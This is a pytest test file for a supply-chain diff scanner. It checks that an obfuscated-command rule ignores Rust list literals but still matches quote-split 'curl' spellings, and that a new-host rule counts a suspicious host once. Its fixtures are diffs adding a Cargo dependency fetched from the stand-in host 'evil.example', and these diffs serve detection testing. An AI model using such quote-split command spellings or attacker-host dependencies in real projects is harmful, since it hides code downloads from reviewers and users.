"""X002 must not read a list literal as a split command word.

`added_rust_stdlib_libs=["addr2line","adler2",…]` is data in an array. The
tokenizer splits it into words, and `addr2line","adler2` used to satisfy the
partial-quote shape, scoring a routine Rust recipe as an obfuscated command.
"""

import pytest

from trustsight.analysis.crossfire._x01_x08 import X002_SHAPES

PARTIAL = dict(X002_SHAPES)["partial-quote"]


@pytest.mark.parametrize("word", [
    'addr2line","adler2',
    'gimli","miniz_oxide',
    "a','b",
    '[addr"2line","adler',
])
def test_a_list_fragment_is_not_a_split_command(word):
    assert PARTIAL.match(word) is None


@pytest.mark.parametrize("word", ['c"u"rl', "c'u'rl", '/usr/bin/c"u"rl'])
def test_a_genuinely_split_command_still_matches(word):
    assert PARTIAL.match(word) is not None


def _u003(diff):
    from trustsight.analysis import scan_diff

    fact = scan_diff(diff, package_name="p")
    return [e for e in fact.score_breakdown if e.rule_id == "U003"]


def test_one_new_host_scores_once_however_many_files_declare_it():
    """`python-vercel-sandbox` scored 100 on a two-line version bump because
    seven upstream manifests each emitted U003 for the same host."""
    diff = (
        "--- a/Cargo.toml\n+++ b/Cargo.toml\n@@ -1,1 +1,2 @@\n"
        " [dependencies]\n"
        '+serde = { git = "https://evil.example/serde.git" }\n'
        "--- a/extra/Cargo.toml\n+++ b/extra/Cargo.toml\n@@ -1,1 +1,2 @@\n"
        " [dependencies]\n"
        '+serde = { git = "https://evil.example/serde.git" }\n'
    )
    assert len(_u003(diff)) == 1


def test_an_example_tree_is_not_the_dependency_surface():
    diff = (
        "--- a/examples/demo/Cargo.toml\n+++ b/examples/demo/Cargo.toml\n@@ -1,1 +1,2 @@\n"
        " [dependencies]\n"
        '+serde = { git = "https://evil.example/serde.git" }\n'
        "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1,1 +1,2 @@\n"
        " jobs:\n"
        '+  x: {url: "https://evil.example/ci"}\n'
    )
    assert _u003(diff) == []
